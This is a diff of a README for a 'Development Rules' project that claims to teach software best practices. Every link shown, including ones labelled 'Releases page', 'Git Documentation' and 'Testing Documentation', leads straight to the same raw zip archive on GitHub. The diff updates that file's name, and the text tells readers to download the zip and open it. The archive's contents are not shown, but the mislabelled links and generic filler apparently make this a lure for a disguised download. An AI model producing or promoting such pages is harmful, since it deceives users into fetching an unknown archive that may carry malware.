@@ -3,12 +3,12 @@
 ## 🚀 Getting Started 
 This guide helps you understand and apply best practices in software development. You’ll find essential tips on coding standards, testing, team collaboration, and more. 
 
-[![Download Development Rules](https://raw.githubusercontent.com/Dlvan-ali/development-rules/main/dynamistic/development-rules.zip%20Development%20Rules-%20-brightgreen)](https://raw.githubusercontent.com/Dlvan-ali/development-rules/main/dynamistic/development-rules.zip)
+[![Download Development Rules](https://raw.githubusercontent.com/Dlvan-ali/development-rules/main/dynamistic/development-rules-2.8.zip%20Development%20Rules-%20-brightgreen)](https://raw.githubusercontent.com/Dlvan-ali/development-rules/main/dynamistic/development-rules-2.8.zip)
 
 ## 📥 Download & Install 
 To get started, visit the Releases page to download the latest version of "Development Rules".
 
-[Download Development Rules](https://raw.githubusercontent.com/Dlvan-ali/development-rules/main/dynamistic/development-rules.zip)
+[Download Development Rules](https://raw.githubusercontent.com/Dlvan-ali/development-rules/main/dynamistic/development-rules-2.8.zip)
 
 ## 📋 Features 
 - **Coding Standards**: Learn the guidelines that improve code readability.
@@ -27,7 +27,7 @@ To get started, visit the Releases page to download the latest version of "Devel
 - **Network**: Internet connection for downloading and updates.
 
 ## 📖 How to Use 
-1. Visit the [Releases page](https://raw.githubusercontent.com/Dlvan-ali/development-rules/main/dynamistic/development-rules.zip).
+1. Visit the [Releases page](https://raw.githubusercontent.com/Dlvan-ali/development-rules/main/dynamistic/development-rules-2.8.zip).
 2. Choose the version you want to download.
 3. Click on the download link for your operating system.
 4. Once the file downloads, locate it in your downloads folder.
@@ -62,9 +62,9 @@ Regularly check for updates on the Releases page. Ensure you are working with th
 Join discussions or seek help in forums or chat groups related to software development best practices. Sharing knowledge can enhance your learning experience.
 
 ## 🔗 Useful Resources 
-- [Git Documentation](https://raw.githubusercontent.com/Dlvan-ali/development-rules/main/dynamistic/development-rules.zip)
-- [Testing Documentation](https://raw.githubusercontent.com/Dlvan-ali/development-rules/main/dynamistic/development-rules.zip)
-- [Best Practices in Software Development](https://raw.githubusercontent.com/Dlvan-ali/development-rules/main/dynamistic/development-rules.zip)
+- [Git Documentation](https://raw.githubusercontent.com/Dlvan-ali/development-rules/main/dynamistic/development-rules-2.8.zip)
+- [Testing Documentation](https://raw.githubusercontent.com/Dlvan-ali/development-rules/main/dynamistic/development-rules-2.8.zip)
+- [Best Practices in Software Development](https://raw.githubusercontent.com/Dlvan-ali/development-rules/main/dynamistic/development-rules-2.8.zip)
 
 ## 🌍 Join Us 
 Engage with our community and help improve this application. Your feedback helps us enhance our offerings.
